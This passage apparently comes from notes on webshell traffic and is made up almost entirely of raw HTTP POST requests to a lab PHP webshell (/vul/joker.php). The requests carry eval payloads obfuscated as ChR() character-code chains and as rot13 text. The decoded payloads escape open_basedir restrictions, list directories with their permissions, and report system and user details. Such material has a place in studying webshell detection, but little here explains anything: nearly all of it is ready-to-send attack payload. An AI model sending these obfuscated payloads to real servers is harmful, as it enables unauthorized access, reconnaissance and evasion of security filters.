hR(67).ChR(34).ChR(44).ChR(34).ChR(90).ChR(34).ChR(41).ChR(97).ChR(115).ChR(32).ChR(36).ChR(76).ChR(41).ChR(105).ChR(102).ChR(40).ChR(105).ChR(115).ChR(95).ChR(100).ChR(105).ChR(114).ChR(40).ChR(34).ChR(123).ChR(36).ChR(76).ChR(125).ChR(58).ChR(34).ChR(41).ChR(41).ChR(36).ChR(82).ChR(46).ChR(61).ChR(34).ChR(123).ChR(36).ChR(76).ChR(125).ChR(58).ChR(34).ChR(59).ChR(125).ChR(101).ChR(108).ChR(115).ChR(101).ChR(123).ChR(36).ChR(82).ChR(46).ChR(61).ChR(34).ChR(47).ChR(34).ChR(59).ChR(125).ChR(36).ChR(82).ChR(46).ChR(61).ChR(34).ChR(9).ChR(34).ChR(59).ChR(36).ChR(117).ChR(61).ChR(40).ChR(102).ChR(117).ChR(110).ChR(99).ChR(116).ChR(105).ChR(111).ChR(110).ChR(95).ChR(101).ChR(120).ChR(105).ChR(115).ChR(116).ChR(115).ChR(40).ChR(34).ChR(112).ChR(111).ChR(115).ChR(105).ChR(120).ChR(95).ChR(103).ChR(101).ChR(116).ChR(101).ChR(103).ChR(105).ChR(100).ChR(34).ChR(41).ChR(41).ChR(63).ChR(64).ChR(112).ChR(111).ChR(115).ChR(105).ChR(120).ChR(95).ChR(103).ChR(101).ChR(116).ChR(112).ChR(119).ChR(117).ChR(105).ChR(100).ChR(40).ChR(64).ChR(112).ChR(111).ChR(115).ChR(105).ChR(120).ChR(95).ChR(103).ChR(101).ChR(116).ChR(101).ChR(117).ChR(105).ChR(100).ChR(40).ChR(41).ChR(41).ChR(58).ChR(34).ChR(34).ChR(59).ChR(36).ChR(115).ChR(61).ChR(40).ChR(36).ChR(117).ChR(41).ChR(63).ChR(36).ChR(117).ChR(91).ChR(34).ChR(110).ChR(97).ChR(109).ChR(101).ChR(34).ChR(93).ChR(58).ChR(64).ChR(103).ChR(101).ChR(116).ChR(95).ChR(99).ChR(117).ChR(114).ChR(114).ChR(101).ChR(110).ChR(116).ChR(95).ChR(117).ChR(115).ChR(101).ChR(114).ChR(40).ChR(41).ChR(59).ChR(36).ChR(82).ChR(46).ChR(61).ChR(112).ChR(104).ChR(112).ChR(95).ChR(117).ChR(110).ChR(97).ChR(109).ChR(101).ChR(40).ChR(41).ChR(59).ChR(36).ChR(82).ChR(46).ChR(61).ChR(34).ChR(9).ChR(123).ChR(36).ChR(115).ChR(125).ChR(34).ChR(59).ChR(101).ChR(99).ChR(104).ChR(111).ChR(32).ChR(36).ChR(82).ChR(59).ChR(59).ChR(125).ChR(99).ChR(97).ChR(116).ChR(99).ChR(104).ChR(40).ChR(69).ChR(120).ChR(99).ChR(101).ChR(112).ChR(116).ChR(105).ChR(111).ChR(110).ChR(32).ChR(36).ChR(101).ChR(41).ChR(123).ChR(101).ChR(99).ChR(104).ChR(111).ChR(32).ChR(34).ChR(69).ChR(82).ChR(82).ChR(79).ChR(82).ChR(58).ChR(47).ChR(47).ChR(34).ChR(46).ChR(36).ChR(101).ChR(45).ChR(62).ChR(103).ChR(101).ChR(116).ChR(77).ChR(101).ChR(115).ChR(115).ChR(97).ChR(103).ChR(101).ChR(40).ChR(41).ChR(59).ChR(125).ChR(59).ChR(97).ChR(115).ChR(111).ChR(117).ChR(116).ChR(112).ChR(117).ChR(116).ChR(40).ChR(41).ChR(59).ChR(100).ChR(105).ChR(101).ChR(40).ChR(41).ChR(59))%3B
```

![image-20231102142753530](./Webshell.assets/image-20231102142753530.png)

chr16

```http
POST /vul/joker.php HTTP/1.1
Host: 100.1.1.131:9221
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1866.237 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Content-Length: 12175
Connection: close

g1e92c262d488e=WIL3Zhci93d3cvaHRtbC92dWwv&shell=%40eVAl(cHr(0x40).ChR(0x69).ChR(0x6e).ChR(0x69).ChR(0x5f).ChR(0x73).ChR(0x65).ChR(0x74).ChR(0x28).ChR(0x22).ChR(0x64).ChR(0x69).ChR(0x73).ChR(0x70).ChR(0x6c).ChR(0x61).ChR(0x79).ChR(0x5f).ChR(0x65).ChR(0x72).ChR(0x72).ChR(0x6f).ChR(0x72).ChR(0x73).ChR(0x22).ChR(0x2c).ChR(0x20).ChR(0x22).ChR(0x30).ChR(0x22).ChR(0x29).ChR(0x3b).ChR(0x40).ChR(0x73).ChR(0x65).ChR(0x74).ChR(0x5f).ChR(0x74).ChR(0x69).ChR(0x6d).ChR(0x65).ChR(0x5f).ChR(0x6c).ChR(0x69).ChR(0x6d).ChR(0x69).ChR(0x74).ChR(0x28).ChR(0x30).ChR(0x29).ChR(0x3b).ChR(0x24).ChR(0x6f).ChR(0x70).ChR(0x64).ChR(0x69).ChR(0x72).ChR(0x3d).ChR(0x40).ChR(0x69).ChR(0x6e).ChR(0x69).ChR(0x5f).ChR(0x67).ChR(0x65).ChR(0x74).ChR(0x28).ChR(0x22).ChR(0x6f).ChR(0x70).ChR(0x65).ChR(0x6e).ChR(0x5f).ChR(0x62).ChR(0x61).ChR(0x73).ChR(0x65).ChR(0x64).ChR(0x69).ChR(0x72).ChR(0x22).ChR(0x29).ChR(0x3b).ChR(0x69).ChR(0x66).ChR(0x28).ChR(0x24).ChR(0x6f).ChR(0x70).ChR(0x64).ChR(0x69).ChR(0x72).ChR(0x29).ChR(0x20).ChR(0x7b).ChR(0x24).ChR(0x6f).ChR(0x63).ChR(0x77).ChR(0x64).ChR(0x3d).ChR(0x64).ChR(0x69).ChR(0x72).ChR(0x6e).ChR(0x61).ChR(0x6d).ChR(0x65).ChR(0x28).ChR(0x24).ChR(0x5f).ChR(0x53).ChR(0x45).ChR(0x52).ChR(0x56).ChR(0x45).ChR(0x52).ChR(0x5b).ChR(0x22).ChR(0x53).ChR(0x43).ChR(0x52).ChR(0x49).ChR(0x50).ChR(0x54).ChR(0x5f).ChR(0x46).ChR(0x49).ChR(0x4c).ChR(0x45).ChR(0x4e).ChR(0x41).ChR(0x4d).ChR(0x45).ChR(0x22).ChR(0x5d).ChR(0x29).ChR(0x3b).ChR(0x24).ChR(0x6f).ChR(0x70).ChR(0x61).ChR(0x72).ChR(0x72).ChR(0x3d).ChR(0x70).ChR(0x72).ChR(0x65).ChR(0x67).ChR(0x5f).ChR(0x73).ChR(0x70).ChR(0x6c).ChR(0x69).ChR(0x74).ChR(0x28).ChR(0x62).ChR(0x61).ChR(0x73).ChR(0x65).ChR(0x36).ChR(0x34).ChR(0x5f).ChR(0x64).ChR(0x65).ChR(0x63).ChR(0x6f).ChR(0x64).ChR(0x65).ChR(0x28).ChR(0x22).ChR(0x4c).ChR(0x7a).ChR(0x74).ChR(0x38).ChR(0x4f).ChR(0x69).ChR(0x38).ChR(0x3d).ChR(0x22).ChR(0x29).ChR(0x2c).ChR(0x24).ChR(0x6f).ChR(0x70).ChR(0x64).ChR(0x69).ChR(0x72).ChR(0x29).ChR(0x3b).ChR(0x40).ChR(0x61).ChR(0x72).ChR(0x72).ChR(0x61).ChR(0x79).ChR(0x5f).ChR(0x70).ChR(0x75).ChR(0x73).ChR(0x68).ChR(0x28).ChR(0x24).ChR(0x6f).ChR(0x70).ChR(0x61).ChR(0x72).ChR(0x72).ChR(0x2c).ChR(0x24).ChR(0x6f).ChR(0x63).ChR(0x77).ChR(0x64).ChR(0x2c).ChR(0x73).ChR(0x79).ChR(0x73).ChR(0x5f).ChR(0x67).ChR(0x65).ChR(0x74).ChR(0x5f).ChR(0x74).ChR(0x65).ChR(0x6d).ChR(0x70).ChR(0x5f).ChR(0x64).ChR(0x69).ChR(0x72).ChR(0x28).ChR(0x29).ChR(0x29).ChR(0x3b).ChR(0x66).ChR(0x6f).ChR(0x72).ChR(0x65).ChR(0x61).ChR(0x63).ChR(0x68).ChR(0x28).ChR(0x24).ChR(0x6f).ChR(0x70).ChR(0x61).ChR(0x72).ChR(0x72).ChR(0x20).ChR(0x61).ChR(0x73).ChR(0x20).ChR(0x24).ChR(0x69).ChR(0x74).ChR(0x65).ChR(0x6d).ChR(0x29).ChR(0x20).ChR(0x7b).ChR(0x69).ChR(0x66).ChR(0x28).ChR(0x21).ChR(0x40).ChR(0x69).ChR(0x73).ChR(0x5f).ChR(0x77).ChR(0x72).ChR(0x69).ChR(0x74).ChR(0x61).ChR(0x62).ChR(0x6c).ChR(0x65).ChR(0x28).ChR(0x24).ChR(0x69).ChR(0x74).ChR(0x65).ChR(0x6d).ChR(0x29).ChR(0x29).ChR(0x7b).ChR(0x63).ChR(0x6f).ChR(0x6e).ChR(0x74).ChR(0x69).ChR(0x6e).ChR(0x75).ChR(0x65).ChR(0x3b).ChR(0x7d).ChR(0x3b).ChR(0x24).ChR(0x74).ChR(0x6d).ChR(0x64).ChR(0x69).ChR(0x72).ChR(0x3d).ChR(0x24).ChR(0x69).ChR(0x74).ChR(0x65).ChR(0x6d).ChR(0x2e).ChR(0x22).ChR(0x2f).ChR(0x2e).ChR(0x63).ChR(0x63).ChR(0x33).ChR(0x64).ChR(0x35).ChR(0x66).ChR(0x62).ChR(0x22).ChR(0x3b).ChR(0x40).ChR(0x6d).ChR(0x6b).ChR(0x64).ChR(0x69).ChR(0x72).ChR(0x28).ChR(0x24).ChR(0x74).ChR(0x6d).ChR(0x64).ChR(0x69).ChR(0x72).ChR(0x29).ChR(0x3b).ChR(0x69).ChR(0x66).ChR(0x28).ChR(0x21).ChR(0x40).ChR(0x66).ChR(0x69).ChR(0x6c).ChR(0x65).ChR(0x5f).ChR(0x65).ChR(0x78).ChR(0x69).ChR(0x73).ChR(0x74).ChR(0x73).ChR(0x28).ChR(0x24).ChR(0x74).ChR(0x6d).ChR(0x64).ChR(0x69).ChR(0x72).ChR(0x29).ChR(0x29).ChR(0x7b).ChR(0x63).ChR(0x6f).ChR(0x6e).ChR(0x74).ChR(0x69).ChR(0x6e).ChR(0x75).ChR(0x65).ChR(0x3b).ChR(0x7d).ChR(0x24).ChR(0x74).ChR(0x6d).ChR(0x64).ChR(0x69).ChR(0x72).ChR(0x3d).ChR(0x72).ChR(0x65).ChR(0x61).ChR(0x6c).ChR(0x70).ChR(0x61).ChR(0x74).ChR(0x68).ChR(0x28).ChR(0x24).ChR(0x74).ChR(0x6d).ChR(0x64).ChR(0x69).ChR(0x72).ChR(0x29).ChR(0x3b).ChR(0x40).ChR(0x63).ChR(0x68).ChR(0x64).ChR(0x69).ChR(0x72).ChR(0x28).ChR(0x24).ChR(0x74).ChR(0x6d).ChR(0x64).ChR(0x69).ChR(0x72).ChR(0x29).ChR(0x3b).ChR(0x40).ChR(0x69).ChR(0x6e).ChR(0x69).ChR(0x5f).ChR(0x73).ChR(0x65).ChR(0x74).ChR(0x28).ChR(0x22).ChR(0x6f).ChR(0x70).ChR(0x65).ChR(0x6e).ChR(0x5f).ChR(0x62).ChR(0x61).ChR(0x73).ChR(0x65).ChR(0x64).ChR(0x69).ChR(0x72).ChR(0x22).ChR(0x2c).ChR(0x20).ChR(0x22).ChR(0x2e).ChR(0x2e).ChR(0x22).ChR(0x29).ChR(0x3b).ChR(0x24).ChR(0x63).ChR(0x6e).ChR(0x74).ChR(0x61).ChR(0x72).ChR(0x72).ChR(0x3d).ChR(0x40).ChR(0x70).ChR(0x72).ChR(0x65).ChR(0x67).ChR(0x5f).ChR(0x73).ChR(0x70).ChR(0x6c).ChR(0x69).ChR(0x74).ChR(0x28).ChR(0x22).ChR(0x2f).ChR(0x5c).ChR(0x5c).ChR(0x5c).ChR(0x5c).ChR(0x7c).ChR(0x5c).ChR(0x2f).ChR(0x2f).ChR(0x22).ChR(0x2c).ChR(0x24).ChR(0x74).ChR(0x6d).ChR(0x64).ChR(0x69).ChR(0x72).ChR(0x29).ChR(0x3b).ChR(0x66).ChR(0x6f).ChR(0x72).ChR(0x28).ChR(0x24).ChR(0x69).ChR(0x3d).ChR(0x30).ChR(0x3b).ChR(0x24).ChR(0x69).ChR(0x3c).ChR(0x73).ChR(0x69).ChR(0x7a).ChR(0x65).ChR(0x6f).ChR(0x66).ChR(0x28).ChR(0x24).ChR(0x63).ChR(0x6e).ChR(0x74).ChR(0x61).ChR(0x72).ChR(0x72).ChR(0x29).ChR(0x3b).ChR(0x24).ChR(0x69).ChR(0x2b).ChR(0x2b).ChR(0x29).ChR(0x7b).ChR(0x40).ChR(0x63).ChR(0x68).ChR(0x64).ChR(0x69).ChR(0x72).ChR(0x28).ChR(0x22).ChR(0x2e).ChR(0x2e).ChR(0x22).ChR(0x29).ChR(0x3b).ChR(0x7d).ChR(0x3b).ChR(0x40).ChR(0x69).ChR(0x6e).ChR(0x69).ChR(0x5f).ChR(0x73).ChR(0x65).ChR(0x74).ChR(0x28).ChR(0x22).ChR(0x6f).ChR(0x70).ChR(0x65).ChR(0x6e).ChR(0x5f).ChR(0x62).ChR(0x61).ChR(0x73).ChR(0x65).ChR(0x64).ChR(0x69).ChR(0x72).ChR(0x22).ChR(0x2c).ChR(0x22).ChR(0x2f).ChR(0x22).ChR(0x29).ChR(0x3b).ChR(0x40).ChR(0x72).ChR(0x6d).ChR(0x64).ChR(0x69).ChR(0x72).ChR(0x28).ChR(0x24).ChR(0x74).ChR(0x6d).ChR(0x64).ChR(0x69).ChR(0x72).ChR(0x29).ChR(0x3b).ChR(0x62).ChR(0x72).ChR(0x65).ChR(0x61).ChR(0x6b).ChR(0x3b).ChR(0x7d).ChR(0x3b).ChR(0x7d).ChR(0x3b).ChR(0x3b).ChR(0x66).ChR(0x75).ChR(0x6e).ChR(0x63).ChR(0x74).ChR(0x69).ChR(0x6f).ChR(0x6e).ChR(0x20).ChR(0x61).ChR(0x73).ChR(0x65).ChR(0x6e).ChR(0x63).ChR(0x28).ChR(0x24).ChR(0x6f).ChR(0x75).ChR(0x74).ChR(0x29).ChR(0x7b).ChR(0x72).ChR(0x65).ChR(0x74).ChR(0x75).ChR(0x72).ChR(0x6e).ChR(0x20).ChR(0x24).ChR(0x6f).ChR(0x75).ChR(0x74).ChR(0x3b).ChR(0x7d).ChR(0x3b).ChR(0x66).ChR(0x75).ChR(0x6e).ChR(0x63).ChR(0x74).ChR(0x69).ChR(0x6f).ChR(0x6e).ChR(0x20).ChR(0x61).ChR(0x73).ChR(0x6f).ChR(0x75).ChR(0x74).ChR(0x70).ChR(0x75).ChR(0x74).ChR(0x28).ChR(0x29).ChR(0x7b).ChR(0x24).ChR(0x6f).ChR(0x75).ChR(0x74).ChR(0x70).ChR(0x75).ChR(0x74).ChR(0x3d).ChR(0x6f).ChR(0x62).ChR(0x5f).ChR(0x67).ChR(0x65).ChR(0x74).ChR(0x5f).ChR(0x63).ChR(0x6f).ChR(0x6e).ChR(0x74).ChR(0x65).ChR(0x6e).ChR(0x74).ChR(0x73).ChR(0x28).ChR(0x29).ChR(0x3b).ChR(0x6f).ChR(0x62).ChR(0x5f).ChR(0x65).ChR(0x6e).ChR(0x64).ChR(0x5f).ChR(0x63).ChR(0x6c).ChR(0x65).ChR(0x61).ChR(0x6e).ChR(0x28).ChR(0x29).ChR(0x3b).ChR(0x65).ChR(0x63).ChR(0x68).ChR(0x6f).ChR(0x20).ChR(0x22).ChR(0x30).ChR(0x34).ChR(0x33).ChR(0x22).ChR(0x2e).ChR(0x22).ChR(0x64).ChR(0x31).ChR(0x38).ChR(0x22).ChR(0x3b).ChR(0x65).ChR(0x63).ChR(0x68).ChR(0x6f).ChR(0x20).ChR(0x40).ChR(0x61).ChR(0x73).ChR(0x65).ChR(0x6e).ChR(0x63).ChR(0x28).ChR(0x24).ChR(0x6f).ChR(0x75).ChR(0x74).ChR(0x70).ChR(0x75).ChR(0x74).ChR(0x29).ChR(0x3b).ChR(0x65).ChR(0x63).ChR(0x68).ChR(0x6f).ChR(0x20).ChR(0x22).ChR(0x33).ChR(0x64).ChR(0x66).ChR(0x22).ChR(0x2e).ChR(0x22).ChR(0x65).ChR(0x66).ChR(0x31).ChR(0x22).ChR(0x3b).ChR(0x7d).ChR(0x6f).ChR(0x62).ChR(0x5f).ChR(0x73).ChR(0x74).ChR(0x61).ChR(0x72).ChR(0x74).ChR(0x28).ChR(0x29).ChR(0x3b).ChR(0x74).ChR(0x72).ChR(0x79).ChR(0x7b).ChR(0x24).ChR(0x44).ChR(0x3d).ChR(0x62).ChR(0x61).ChR(0x73).ChR(0x65).ChR(0x36).ChR(0x34).ChR(0x5f).ChR(0x64).ChR(0x65).ChR(0x63).ChR(0x6f).ChR(0x64).ChR(0x65).ChR(0x28).ChR(0x73).ChR(0x75).ChR(0x62).ChR(0x73).ChR(0x74).ChR(0x72).ChR(0x28).ChR(0x24).ChR(0x5f).ChR(0x50).ChR(0x4f).ChR(0x53).ChR(0x54).ChR(0x5b).ChR(0x22).ChR(0x67).ChR(0x31).ChR(0x65).ChR(0x39).ChR(0x32).ChR(0x63).ChR(0x32).ChR(0x36).ChR(0x32).ChR(0x64).ChR(0x34).ChR(0x38).ChR(0x38).ChR(0x65).ChR(0x22).ChR(0x5d).ChR(0x2c).ChR(0x32).ChR(0x29).ChR(0x29).ChR(0x3b).ChR(0x24).ChR(0x46).ChR(0x3d).ChR(0x40).ChR(0x6f).ChR(0x70).ChR(0x65).ChR(0x6e).ChR(0x64).ChR(0x69).ChR(0x72).ChR(0x28).ChR(0x24).ChR(0x44).ChR(0x29).ChR(0x3b).ChR(0x69).ChR(0x66).ChR(0x28).ChR(0x24).ChR(0x46).ChR(0x3d).ChR(0x3d).ChR(0x4e).ChR(0x55).ChR(0x4c).ChR(0x4c).ChR(0x29).ChR(0x7b).ChR(0x65).ChR(0x63).ChR(0x68).ChR(0x6f).ChR(0x28).ChR(0x22).ChR(0x45).ChR(0x52).ChR(0x52).ChR(0x4f).ChR(0x52).ChR(0x3a).ChR(0x2f).ChR(0x2f).ChR(0x20).ChR(0x50).ChR(0x61).ChR(0x74).ChR(0x68).ChR(0x20).ChR(0x4e).ChR(0x6f).ChR(0x74).ChR(0x20).ChR(0x46).ChR(0x6f).ChR(0x75).ChR(0x6e).ChR(0x64).ChR(0x20).ChR(0x4f).ChR(0x72).ChR(0x20).ChR(0x4e).ChR(0x6f).ChR(0x20).ChR(0x50).ChR(0x65).ChR(0x72).ChR(0x6d).ChR(0x69).ChR(0x73).ChR(0x73).ChR(0x69).ChR(0x6f).ChR(0x6e).ChR(0x21).ChR(0x22).ChR(0x29).ChR(0x3b).ChR(0x7d).ChR(0x65).ChR(0x6c).ChR(0x73).ChR(0x65).ChR(0x7b).ChR(0x24).ChR(0x4d).ChR(0x3d).ChR(0x4e).ChR(0x55).ChR(0x4c).ChR(0x4c).ChR(0x3b).ChR(0x24).ChR(0x4c).ChR(0x3d).ChR(0x4e).ChR(0x55).ChR(0x4c).ChR(0x4c).ChR(0x3b).ChR(0x77).ChR(0x68).ChR(0x69).ChR(0x6c).ChR(0x65).ChR(0x28).ChR(0x24).ChR(0x4e).ChR(0x3d).ChR(0x40).ChR(0x72).ChR(0x65).ChR(0x61).ChR(0x64).ChR(0x64).ChR(0x69).ChR(0x72).ChR(0x28).ChR(0x24).ChR(0x46).ChR(0x29).ChR(0x29).ChR(0x7b).ChR(0x24).ChR(0x50).ChR(0x3d).ChR(0x24).ChR(0x44).ChR(0x2e).ChR(0x24).ChR(0x4e).ChR(0x3b).ChR(0x24).ChR(0x54).ChR(0x3d).ChR(0x40).ChR(0x64).ChR(0x61).ChR(0x74).ChR(0x65).ChR(0x28).ChR(0x22).ChR(0x59).ChR(0x2d).ChR(0x6d).ChR(0x2d).ChR(0x64).ChR(0x20).ChR(0x48).ChR(0x3a).ChR(0x69).ChR(0x3a).ChR(0x73).ChR(0x22).ChR(0x2c).ChR(0x40).ChR(0x66).ChR(0x69).ChR(0x6c).ChR(0x65).ChR(0x6d).ChR(0x74).ChR(0x69).ChR(0x6d).ChR(0x65).ChR(0x28).ChR(0x24).ChR(0x50).ChR(0x29).ChR(0x29).ChR(0x3b).ChR(0x40).ChR(0x24).ChR(0x45).ChR(0x3d).ChR(0x73).ChR(0x75).ChR(0x62).ChR(0x73).ChR(0x74).ChR(0x72).ChR(0x28).ChR(0x62).ChR(0x61).ChR(0x73).ChR(0x65).ChR(0x5f).ChR(0x63).ChR(0x6f).ChR(0x6e).ChR(0x76).ChR(0x65).ChR(0x72).ChR(0x74).ChR(0x28).ChR(0x40).ChR(0x66).ChR(0x69).ChR(0x6c).ChR(0x65).ChR(0x70).ChR(0x65).ChR(0x72).ChR(0x6d).ChR(0x73).ChR(0x28).ChR(0x24).ChR(0x50).ChR(0x29).ChR(0x2c).ChR(0x31).ChR(0x30).ChR(0x2c).ChR(0x38).ChR(0x29).ChR(0x2c).ChR(0x2d).ChR(0x34).ChR(0x29).ChR(0x3b).ChR(0x24).ChR(0x52).ChR(0x3d).ChR(0x22).ChR(0x9).ChR(0x22).ChR(0x2e).ChR(0x24).ChR(0x54).ChR(0x2e).ChR(0x22).ChR(0x9).ChR(0x22).ChR(0x2e).ChR(0x40).ChR(0x66).ChR(0x69).ChR(0x6c).ChR(0x65).ChR(0x73).ChR(0x69).ChR(0x7a).ChR(0x65).ChR(0x28).ChR(0x24).ChR(0x50).ChR(0x29).ChR(0x2e).ChR(0x22).ChR(0x9).ChR(0x22).ChR(0x2e).ChR(0x24).ChR(0x45).ChR(0x2e).ChR(0x22).ChR(0xa).ChR(0x22).ChR(0x3b).ChR(0x69).ChR(0x66).ChR(0x28).ChR(0x40).ChR(0x69).ChR(0x73).ChR(0x5f).ChR(0x64).ChR(0x69).ChR(0x72).ChR(0x28).ChR(0x24).ChR(0x50).ChR(0x29).ChR(0x29).ChR(0x24).ChR(0x4d).ChR(0x2e).ChR(0x3d).ChR(0x24).ChR(0x4e).ChR(0x2e).ChR(0x22).ChR(0x2f).ChR(0x22).ChR(0x2e).ChR(0x24).ChR(0x52).ChR(0x3b).ChR(0x65).ChR(0x6c).ChR(0x73).ChR(0x65).ChR(0x20).ChR(0x24).ChR(0x4c).ChR(0x2e).ChR(0x3d).ChR(0x24).ChR(0x4e).ChR(0x2e).ChR(0x24).ChR(0x52).ChR(0x3b).ChR(0x7d).ChR(0x65).ChR(0x63).ChR(0x68).ChR(0x6f).ChR(0x20).ChR(0x24).ChR(0x4d).ChR(0x2e).ChR(0x24).ChR(0x4c).ChR(0x3b).ChR(0x40).ChR(0x63).ChR(0x6c).ChR(0x6f).ChR(0x73).ChR(0x65).ChR(0x64).ChR(0x69).ChR(0x72).ChR(0x28).ChR(0x24).ChR(0x46).ChR(0x29).ChR(0x3b).ChR(0x7d).ChR(0x3b).ChR(0x7d).ChR(0x63).ChR(0x61).ChR(0x74).ChR(0x63).ChR(0x68).ChR(0x28).ChR(0x45).ChR(0x78).ChR(0x63).ChR(0x65).ChR(0x70).ChR(0x74).ChR(0x69).ChR(0x6f).ChR(0x6e).ChR(0x20).ChR(0x24).ChR(0x65).ChR(0x29).ChR(0x7b).ChR(0x65).ChR(0x63).ChR(0x68).ChR(0x6f).ChR(0x20).ChR(0x22).ChR(0x45).ChR(0x52).ChR(0x52).ChR(0x4f).ChR(0x52).ChR(0x3a).ChR(0x2f).ChR(0x2f).ChR(0x22).ChR(0x2e).ChR(0x24).ChR(0x65).ChR(0x2d).ChR(0x3e).ChR(0x67).ChR(0x65).ChR(0x74).ChR(0x4d).ChR(0x65).ChR(0x73).ChR(0x73).ChR(0x61).ChR(0x67).ChR(0x65).ChR(0x28).ChR(0x29).ChR(0x3b).ChR(0x7d).ChR(0x3b).ChR(0x61).ChR(0x73).ChR(0x6f).ChR(0x75).ChR(0x74).ChR(0x70).ChR(0x75).ChR(0x74).ChR(0x28).ChR(0x29).ChR(0x3b).ChR(0x64).ChR(0x69).ChR(0x65).ChR(0x28).ChR(0x29).ChR(0x3b))%3B
```

![image-20231102143227452](./Webshell.assets/image-20231102143227452.png)

rot13

```http
POST /vul/joker.php HTTP/1.1
Host: 100.1.1.131:9221
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 4.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Content-Length: 1931
Connection: close

c701f3f15ec53f=kjL3Zhci93d3cvaHRtbC92dWwv&m9d53841380566=%40vav_frg(%22qvfcynl_reebef%22%2C%20%220%22)%3B%40frg_gvzr_yvzvg(0)%3B%24bcqve%3D%40vav_trg(%22bcra_onfrqve%22)%3Bvs(%24bcqve)%20%7B%24bpjq%3Dqveanzr(%24_FREIRE%5B%22FPEVCG_SVYRANZR%22%5D)%3B%24bcnee%3Dcert_fcyvg(onfr64_qrpbqr(%22Ymg8Bv8%3D%22)%2C%24bcqve)%3B%40neenl_chfu(%24bcnee%2C%24bpjq%2Cflf_trg_grzc_qve())%3Bsbernpu(%24bcnee%20nf%20%24vgrz)%20%7Bvs(!%40vf_jevgnoyr(%24vgrz))%7Bpbagvahr%3B%7D%3B%24gzqve%3D%24vgrz.%22%2F.0o7s6436%22%3B%40zxqve(%24gzqve)%3Bvs(!%40svyr_rkvfgf(%24gzqve))%7Bpbagvahr%3B%7D%24gzqve%3Dernycngu(%24gzqve)%3B%40puqve(%24gzqve)%3B%40vav_frg(%22bcra_onfrqve%22%2C%20%22..%22)%3B%24pagnee%3D%40cert_fcyvg(%22%2F%5C%5C%5C%5C%7C%5C%2F%2F%22%2C%24gzqve)%3Bsbe(%24v%3D0%3B%24v%3Cfvmrbs(%24pagnee)%3B%24v%2B%2B)%7B%40puqve(%22..%22)%3B%7D%3B%40vav_frg(%22bcra_onfrqve%22%2C%22%2F%22)%3B%40ezqve(%24gzqve)%3Boernx%3B%7D%3B%7D%3B%3Bshapgvba%20nfrap(%24bhg)%7Berghea%20%24bhg%3B%7D%3Bshapgvba%20nfbhgchg()%7B%24bhgchg%3Dbo_trg_pbagragf()%3Bbo_raq_pyrna()%3Brpub%20%220231%22.%221qspp%22%3Brpub%20%40nfrap(%24bhgchg)%3Brpub%20%22q9%22.%229s9%22%3B%7Dbo_fgneg()%3Bgel%7B%24Q%3Donfr64_qrpbqr(fhofge(%24_CBFG%5B%22p701s3s15rp53s%22%5D%2C2))%3B%24S%3D%40bcraqve(%24Q)%3Bvs(%24S%3D%3DAHYY)%7Brpub(%22REEBE%3A%2F%2F%20Cngu%20Abg%20Sbhaq%20Be%20Ab%20Crezvffvba!%22)%3B%7Dryfr%7B%24Z%3DAHYY%3B%24Y%3DAHYY%3Bjuvyr(%24A%3D%40ernqqve(%24S))%7B%24C%3D%24Q.%24A%3B%24G%3D%40qngr(%22L-z-q%20U%3Av%3Af%22%2C%40svyrzgvzr(%24C))%3B%40%24R%3Dfhofge(onfr_pbaireg(%40svyrcrezf(%24C)%2C10%2C8)%2C-4)%3B%24E%3D%22%09%22.%24G.%22%09%22.%40svyrfvmr(%24C).%22%09%22.%24R.%22%0A%22%3Bvs(%40vf_qve(%24C))%24Z.%3D%24A.%22%2F%22.%24E%3Bryfr%20%24Y.%3D%24A.%24E%3B%7Drpub%20%24Z.%24Y%3B%40pybfrqve(%24S)%3B%7D%3B%7Dpngpu(Rkprcgvba%20%24r)%7Brpub%20%22REEBE%3A%2F%2F%22.%24r-%3EtrgZrffntr()%3B%7D%3Bnfbhgchg()%3Bqvr()%3B&shell=%40eval(%40str_rot13(%24_POST%5B'm9d53841380566'%5D))%3B
```

![image-20231102144103356](./Webshell.assets/image-20231102144103356.png)















